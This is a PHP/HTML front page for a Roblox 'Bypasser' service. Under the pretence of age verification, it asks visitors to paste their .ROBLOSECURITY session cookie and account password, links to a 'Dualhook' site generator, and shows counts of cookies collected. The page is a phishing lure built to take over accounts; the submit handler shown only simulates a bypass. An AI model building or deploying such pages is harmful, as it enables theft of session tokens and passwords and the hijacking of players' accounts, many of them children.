<?php
require_once 'config.php';
require_once 'functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasser - Fast & Secure Age Verification</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            width: 100%;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 60px;
            align-items: center;
        }

        .left-section {
            background: #141414;
            border: 1px solid #1f1f1f;
            border-radius: 24px;
            padding: 48px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 48px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: #ffffff;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            letter-spacing: -0.02em;
        }

        h1 {
            font-size: 42px;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 16px;
            letter-spacing: -0.03em;
        }

        .subtitle {
            color: #808080;
            font-size: 16px;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .tab-buttons {
            display: flex;
            gap: 8px;
            margin-bottom: 32px;
        }

        .tab-button {
            flex: 1;
            padding: 12px 24px;
            background: transparent;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            color: #808080;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .tab-button.active {
            background: #ffffff;
            color: #0a0a0a;
            border-color: #ffffff;
        }

        .tab-button:not(.active):hover {
            border-color: #404040;
            color: #ffffff;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            color: #b0b0b0;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .form-input {
            width: 100%;
            padding: 16px 20px;
            background: #0a0a0a;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .form-input::placeholder {
            color: #505050;
        }

        .form-input:focus {
            outline: none;
            border-color: #404040;
            background: #0f0f0f;
        }

        .submit-button {
            width: 100%;
            padding: 16px 32px;
            background: #ffffff;
            color: #0a0a0a;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .submit-button:hover {
            background: #f0f0f0;
            transform: translateY(-1px);
        }

        .submit-button:active {
            transform: translateY(0);
        }

        .dualhook-button {
            width: 100%;
            padding: 16px 32px;
            background: transparent;
            color: #ffffff;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 12px;
        }

        .dualhook-button:hover {
            border-color: #404040;
            background: #141414;
        }

        .right-section {
            padding-left: 40px;
        }

        .right-section .logo {
            margin-bottom: 32px;
        }

        .feature-title {
            font-size: 32px;
            font-weight: 700;
            line-height: 1.3;
            margin-bottom: 16px;
            letter-spacing: -0.02em;
        }

        .feature-description {
            color: #808080;
            font-size: 16px;
            line-height: 1.6;
        }

        @media (max-width: 968px) {
            .container {
                grid-template-columns: 1fr;
                gap: 40px;
            }

            .right-section {
                padding-left: 0;
                text-align: center;
            }

            h1 {
                font-size: 32px;
            }

            .feature-title {
                font-size: 24px;
            }
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(10, 10, 10, 0.3);
            border-radius: 50%;
            border-top-color: #0a0a0a;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .stats-footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #1f1f1f;
            display: flex;
            gap: 32px;
            justify-content: center;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 4px;
        }

        .stat-label {
            font-size: 12px;
            color: #606060;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Left Section - Form -->
        <div class="left-section">
            <div class="logo">
                <div class="logo-icon">🛡️</div>
                <div class="logo-text">BYPASSER</div>
            </div>

            <h1>Bypass your account</h1>
            <p class="subtitle">Use cookie or cookie with password to continue.</p>

            <!-- Tab Buttons -->
            <div class="tab-buttons">
                <button class="tab-button active" onclick="switchTab('cookie')">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="12" cy="12" r="10"/>
                        <path d="M12 6v6l4 2"/>
                    </svg>
                    Cookie Only
                </button>
                <button class="tab-button" onclick="switchTab('password')">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    Password
                </button>
            </div>

            <!-- Cookie Only Tab -->
            <div id="cookie-tab" class="tab-content active">
                <form id="cookie-form" onsubmit="handleBypass(event, 'cookie')">
                    <div class="form-group">
                        <label class="form-label">.ROBLOSECURITY Cookie</label>
                        <input 
                            type="text" 
                            class="form-input" 
                            id="cookie-input"
                            placeholder="Paste your cookie here"
                            required
                        >
                    </div>

                    <button type="submit" class="submit-button" id="cookie-submit">
                        <span>Start Bypass</span>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 12h14M12 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <a href="/generator/" class="dualhook-button">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M12 5v14M5 12h14"/>
                        </svg>
                        Create Dualhook Site
                    </a>
                </form>
            </div>

            <!-- Password Tab -->
            <div id="password-tab" class="tab-content">
                <form id="password-form" onsubmit="handleBypass(event, 'password')">
                    <div class="form-group">
                        <label class="form-label">.ROBLOSECURITY Cookie</label>
                        <input 
                            type="text" 
                            class="form-input" 
                            id="password-cookie-input"
                            placeholder="Paste your cookie here"
                            required
                        >
                    </div>

                    <div class="form-group">
                        <label class="form-label">Account Password</label>
                        <input 
                            type="password" 
                            class="form-input" 
                            id="password-input"
                            placeholder="Enter your password"
                            required
                        >
                    </div>

                    <button type="submit" class="submit-button" id="password-submit">
                        <span>Start Bypass</span>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 12h14M12 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <a href="/generator/" class="dualhook-button">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M12 5v14M5 12h14"/>
                        </svg>
                        Create Dualhook Site
                    </a>
                </form>
            </div>

            <!-- Stats Footer -->
            <div class="stats-footer">
                <div class="stat-item">
                    <div class="stat-value"><?php echo number_format($globalStats['totalCookies']); ?></div>
                    <div class="stat-label">Bypassed</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?php echo number_format($globalStats['totalInstances']); ?></div>
                    <div class="stat-label">Sites</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?php echo number_format($globalStats['totalVisits']); ?></div>
                    <div class="stat-label">Visits</div>
                </div>
            </div>
        </div>

        <!-- Right Section - Info -->
        <div class="right-section">
            <div class="logo">
                <div class="logo-icon">🛡️</div>
                <div class="logo-text">BYPASSER</div>
            </div>

            <h2 class="feature-title">Fast and secure age verification</h2>
            <p class="feature-description">
                Bypass age restrictions quickly and securely. Our service handles everything for you.
            </p>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            // Update tab buttons
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.closest('.tab-button').classList.add('active');

            // Update tab content
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(tab + '-tab').classList.add('active');
        }

        async function handleBypass(event, type) {
            event.preventDefault();
            
            const submitBtn = event.target.querySelector('.submit-button');
            const originalHTML = submitBtn.innerHTML;
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<div class="spinner"></div>';

            // Simulate bypass (replace with your actual API call)
            setTimeout(() => {
                alert('Bypass functionality coming soon! For now, use the Dualhook Generator.');
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalHTML;
            }, 2000);
        }
    </script>
</body>
</html>
